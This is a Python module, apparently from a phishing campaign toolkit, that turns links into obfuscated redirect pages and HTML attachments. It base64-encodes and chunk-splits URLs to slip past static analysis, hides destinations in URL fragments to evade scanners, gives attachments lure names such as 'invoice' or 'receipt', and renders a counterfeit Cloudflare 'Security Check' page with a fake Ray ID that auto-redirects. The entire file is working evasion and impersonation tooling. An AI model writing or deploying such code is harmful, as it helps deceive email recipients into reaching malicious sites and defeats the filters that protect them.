"""
core/link_encoder.py — SynthTel Link Encoding Engine
=====================================================
Provides 4 link encoding methods matching Ghost Hacker OS [SF_*] syntax,
plus Cloudflare Security Check wrapper and HTML attachment redirect builder.

Encoding methods
----------------
0  plain              — URL as-is (no encoding)
1  percent_encode     — RFC 3986 percent-encoding of the URL
2  base64_encode      — base64 the URL, JS decodes + redirects on load
3  fragment_redirect  — destination in #fragment (never sent to server),
                        JS reads location.hash and redirects
4  html_attachment    — link becomes an HTML file attachment (redirect page)
5  cf_security_check  — HTML attachment wrapped in Cloudflare-style
                        "Security Check / Please wait…" page

Usage
-----
    from core.link_encoder import encode_link, build_redirect_attachment

    # Encode a URL inline in HTML
    encoded = encode_link("https://example.com/track?id=123", method=3)

    # Build an HTML attachment that redirects to the link
    html_bytes, filename = build_redirect_attachment(
        url="https://example.com/track?id=123",
        method=5,          # Cloudflare security-check style
        filename="doc.html"
    )

Tag syntax in HTML templates
-----------------------------
    [LINK]                    → plain URL
    [SF_PERCENT_ENCODE]       → percent-encoded URL
    [SF_BASE64_ENCODE]        → base64 URL with JS decode
    [SF_FRAGMENT_REDIRECT]    → fragment redirect page
    [SF_CF_REDIRECT]          → Cloudflare security-check attachment trigger

    Call resolve_link_tags(html, url, method) to process all tags in one pass.
"""

import re
import base64
import random
import string
import hashlib
from urllib.parse import quote


# ═══════════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════════

METHOD_PLAIN             = 0
METHOD_PERCENT_ENCODE    = 1
METHOD_BASE64_ENCODE     = 2
METHOD_FRAGMENT_REDIRECT = 3
METHOD_HTML_ATTACHMENT   = 4
METHOD_CF_SECURITY_CHECK = 5

METHOD_NAMES = {
    0: "plain",
    1: "percent_encode",
    2: "base64_encode",
    3: "fragment_redirect",
    4: "html_attachment",
    5: "cf_security_check",
}

# Tag → method mapping for template tag resolution
_TAG_METHOD = {
    "[LINK]":                METHOD_PLAIN,
    "[SF_PERCENT_ENCODE]":   METHOD_PERCENT_ENCODE,
    "[SF_BASE64_ENCODE]":    METHOD_BASE64_ENCODE,
    "[SF_FRAGMENT_REDIRECT]":METHOD_FRAGMENT_REDIRECT,
    "[SF_CF_REDIRECT]":      METHOD_CF_SECURITY_CHECK,
}

# Cloudflare-style page appearance options
_CF_TITLES = [
    "Just a moment...",
    "Checking your browser...",
    "Security Check",
    "Please wait...",
    "One moment please...",
]

_CF_MESSAGES = [
    "Please wait while we verify your browser.",
    "Checking if the site connection is secure.",
    "Verifying your connection before proceeding.",
    "Please complete the security check to continue.",
    "Your connection to this site is being checked.",
]

_CF_BTN_LABELS = [
    "Continue to Site",
    "Proceed",
    "Continue",
    "Verify and Continue",
    "Access Site",
]

# Realistic browser User-Agent strings for meta refresh / redirect
_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]


# ═══════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════

def _rand_id(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _rand_var(prefix="v"):
    return prefix + ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))

def _obfuscate_js_string(s):
    """
    Split a string into random-length chunks joined by concatenation.
    Makes link harder to extract via static analysis.
    'https://ex.com' → 'https://' + 'ex' + '.com'
    """
    if len(s) < 8:
        return f'"{s}"'
    parts = []
    i = 0
    while i < len(s):
        chunk_len = random.randint(2, 8)
        chunk = s[i:i+chunk_len]
        parts.append(f'"{chunk}"')
        i += chunk_len
    return '+'.join(parts)


# ═══════════════════════════════════════════════════════════════
# ENCODING METHODS
# ═══════════════════════════════════════════════════════════════

def encode_plain(url: str) -> str:
    """Method 0 — URL as-is."""
    return url


def encode_percent(url: str) -> str:
    """
    Method 1 — RFC 3986 percent-encoding.
    Encodes everything except unreserved chars (letters, digits, -._~).
    The result is a valid URL that most email clients and redirectors handle.
    """
    return quote(url, safe="/:@?=&#%+")


def encode_base64(url: str) -> str:
    """
    Method 2 — base64 the URL, wrap in a minimal redirect page.
    Returns a data: URI page or an href= value.
    When used as an href, the browser loads a page that decodes and redirects.
    Actually returns the page HTML (to be used as attachment or data URI).
    """
    b64 = base64.b64encode(url.encode()).decode()
    var_name = _rand_var("u")
    var_dest = _rand_var("d")
    return (
        f'<html><head><script>'
        f'var {var_name}="{b64}";'
        f'var {var_dest}=atob({var_name});'
        f'window.location.replace({var_dest});'
        f'</script>'
        f'<noscript><meta http-equiv="refresh" content="0;url={url}"></noscript>'
        f'</head><body></body></html>'
    )


def encode_fragment(url: str) -> str:
    """
    Method 3 — destination in URL fragment (#hash).
    The fragment is never sent to the server, so the redirect URL is invisible
    to most URL scanners that only see the page origin.
    Returns HTML page content (to be used as attachment or data URI).
    """
    b64 = base64.b64encode(url.encode()).decode()
    var_h = _rand_var("h")
    var_d = _rand_var("d")
    var_u = _rand_var("u")
    nonce = _rand_id(12)
    return (
        f'<!DOCTYPE html><html><head>'
        f'<title>Redirecting...</title>'
        f'<script>/*{nonce}*/'
        f'(function(){{'
        f'var {var_h}=window.location.hash;'
        f'if({var_h}){{var {var_d}={var_h}.slice(1);'
        f'try{{var {var_u}=atob({var_d});window.location.replace({var_u});}}catch(e){{'
        f'window.location.replace(atob("{b64}"));'
        f'}}'
        f'}}else{{window.location.replace(atob("{b64}"));}}'
        f'}})();'
        f'</script>'
        f'<noscript><meta http-equiv="refresh" content="0;url={url}"></noscript>'
        f'</head><body></body></html>'
    )


def encode_cf_security_check(url: str, title: str = None, message: str = None,
                               btn_label: str = None) -> str:
    """
    Method 5 — Cloudflare-style 'Security Check / Please wait…' page.
    Renders a convincing security check page with a countdown and a
    'Continue to Site' button. Auto-redirects after ~3 seconds.
    Returns full HTML page string.
    """
    title     = title     or random.choice(_CF_TITLES)
    message   = message   or random.choice(_CF_MESSAGES)
    btn_label = btn_label or random.choice(_CF_BTN_LABELS)
    nonce     = _rand_id(16)
    var_c     = _rand_var("c")
    var_t     = _rand_var("t")
    var_u     = _rand_var("u")
    b64_url   = base64.b64encode(url.encode()).decode()
    ray_id    = ''.join(random.choices('0123456789abcdef', k=16))
    colo      = random.choice(["LAX", "LHR", "AMS", "SJC", "ORD", "DFW", "MIA", "SEA"])

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:#f6f6ef;display:flex;align-items:center;justify-content:center;
min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}}
.wrap{{background:#fff;border:1px solid #e5e5e5;border-radius:4px;padding:48px 40px;
max-width:440px;width:90%;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.08)}}
.logo{{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:32px}}
.logo-icon{{width:32px;height:32px}}
.logo-text{{font-size:18px;font-weight:600;color:#404040}}
h1{{font-size:22px;font-weight:600;color:#1d1d1f;margin-bottom:12px}}
p{{font-size:15px;color:#6e6e73;line-height:1.6;margin-bottom:28px}}
.spinner{{width:36px;height:36px;border:3px solid #e5e5e5;
border-top-color:#f48024;border-radius:50%;animation:spin 0.8s linear infinite;
margin:0 auto 24px}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
.btn{{display:inline-block;background:#0051c3;color:#fff;border:none;
border-radius:4px;padding:12px 28px;font-size:15px;font-weight:500;
cursor:pointer;text-decoration:none;transition:background .15s}}
.btn:hover{{background:#0041a3}}
.countdown{{font-size:13px;color:#a0a0a5;margin-top:16px}}
.footer{{margin-top:40px;font-size:12px;color:#a0a0a5;border-top:1px solid #f0f0f0;padding-top:16px}}
.ray{{font-family:monospace;font-size:11px}}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo">
    <svg class="logo-icon" viewBox="0 0 32 32" fill="none">
      <rect width="32" height="32" rx="6" fill="#f48024"/>
      <path d="M8 22l4-12 4 8 4-5 4 9" stroke="#fff" stroke-width="2.2"
            stroke-linecap="round" stroke-linejoin="round" fill="none"/>
    </svg>
    <span class="logo-text">Security Check</span>
  </div>
  <div class="spinner" id="sp-{nonce}"></div>
  <h1 id="ht-{nonce}">{title}</h1>
  <p id="ms-{nonce}">{message}</p>
  <a class="btn" id="btn-{nonce}" href="#">{btn_label}</a>
  <p class="countdown" id="cd-{nonce}">Redirecting automatically in <span id="sc-{nonce}">3</span>s</p>
  <div class="footer">
    <span class="ray">Ray ID: {ray_id}</span> &bull;
    <span>Performance &amp; security by Cloudflare &bull; {colo}</span>
  </div>
</div>
<script>/*{nonce}*/
(function(){{
  var {var_u}=atob("{b64_url}");
  document.getElementById("btn-{nonce}").href={var_u};
  var {var_c}=3;
  var {var_t}=setInterval(function(){{
    {var_c}--;
    var el=document.getElementById("sc-{nonce}");
    if(el)el.textContent={var_c};
    if({var_c}<=0){{clearInterval({var_t});window.location.replace({var_u});}}
  }},1000);
}})();
</script>
</body>
</html>'''


# ═══════════════════════════════════════════════════════════════
# BUILD REDIRECT ATTACHMENT
# ═══════════════════════════════════════════════════════════════

def build_redirect_attachment(
    url:      str,
    method:   int  = METHOD_CF_SECURITY_CHECK,
    filename: str  = None,
) -> tuple:
    """
    Build an HTML attachment that redirects to the URL.
    Returns (html_bytes: bytes, filename: str).

    method 3 = fragment redirect page
    method 4 = minimal redirect (meta refresh + JS)
    method 5 = Cloudflare security-check page (default)
    """
    if not filename:
        ext  = ".html"
        base = random.choice([
            "document", "invoice", "report", "statement", "notification",
            "security", "verification", "confirmation", "receipt", "info",
        ])
        suffix = _rand_id(4)
        filename = f"{base}_{suffix}{ext}"

    if method == METHOD_CF_SECURITY_CHECK:
        html = encode_cf_security_check(url)
    elif method == METHOD_FRAGMENT_REDIRECT:
        html = encode_fragment(url)
    elif method == METHOD_BASE64_ENCODE:
        html = encode_base64(url)
    else:
        # Minimal redirect — fastest, least suspicious for basic scanners
        nonce = _rand_id(12)
        b64   = base64.b64encode(url.encode()).decode()
        var_u = _rand_var("u")
        html  = (
            f'<!DOCTYPE html><html><head><!--{nonce}-->'
            f'<meta http-equiv="refresh" content="0;url={url}">'
            f'<script>var {var_u}=atob("{b64}");window.location.replace({var_u});</script>'
            f'</head><body></body></html>'
        )

    return html.encode("utf-8"), filename


# ═══════════════════════════════════════════════════════════════
# INLINE LINK ENCODER (for href= values)
# ═══════════════════════════════════════════════════════════════

def encode_link(url: str, method: int = METHOD_PLAIN) -> str:
    """
    Encode a URL for use directly in an href= attribute.
    Methods 0-1 return modified URL strings.
    Methods 2-5 return inline data: URIs (usable as href).
    """
    if not url:
        return url
    if method == METHOD_PLAIN:
        return url
    if method == METHOD_PERCENT_ENCODE:
        return encode_percent(url)
    if method == METHOD_BASE64_ENCODE:
        html = encode_base64(url)
        b64  = base64.b64encode(html.encode()).decode()
        return f"data:text/html;base64,{b64}"
    if method == METHOD_FRAGMENT_REDIRECT:
        # Fragment mode: the redirect page URL is the data URI,
        # and the actual destination is appended as the #fragment
        b64_dest = base64.b64encode(url.encode()).decode()
        html = encode_fragment(url)
        b64_page = base64.b64encode(html.encode()).decode()
        return f"data:text/html;base64,{b64_page}#{b64_dest}"
    if method in (METHOD_HTML_ATTACHMENT, METHOD_CF_SECURITY_CHECK):
        # For attachment methods, encode as data URI so it works inline too
        html = encode_cf_security_check(url) if method == METHOD_CF_SECURITY_CHECK else encode_fragment(url)
        b64  = base64.b64encode(html.encode()).decode()
        return f"data:text/html;base64,{b64}"
    return url


# ═══════════════════════════════════════════════════════════════
# TEMPLATE TAG RESOLVER
# ═══════════════════════════════════════════════════════════════

def resolve_link_tags(html: str, url: str, method: int = METHOD_PLAIN) -> str:
    """
    Replace all [LINK] / [SF_*] tags in HTML with the encoded URL.
    Also replaces bare [LINK] in href= attributes.

    For attachment methods (4, 5), replaces the tag with the plain URL
    (the actual attachment is built separately by build_redirect_attachment).
    """
    if not html or not url:
        return html

    # For attachment-mode methods, use the plain URL inline
    # (the attachment redirect is handled separately in campaign.py)
    inline_method = method
    if method in (METHOD_HTML_ATTACHMENT, METHOD_CF_SECURITY_CHECK):
        inline_method = METHOD_PLAIN

    encoded = encode_link(url, inline_method)

    for tag in _TAG_METHOD:
        if tag in html:
            html = html.replace(tag, encoded)

    # Also handle href="[LINK]" pattern with any method
    html = re.sub(
        r'href=["\'][^"\']*\[(?:LINK|SF_[A-Z_]+)\][^"\']*["\']',
        f'href="{encoded}"',
        html,
    )

    return html


def get_method_from_tag(html: str) -> int:
    """
    Detect which link encoding method the template is requesting,
    based on which [SF_*] tag is present.
    Returns METHOD_PLAIN if no special tag found.
    """
    for tag, method in _TAG_METHOD.items():
        if tag in html:
            return method
    return METHOD_PLAIN


def strip_link_tags(html: str) -> str:
    """Remove all [LINK] / [SF_*] tags from HTML (no URL available)."""
    for tag in _TAG_METHOD:
        html = html.replace(tag, "")
    return html
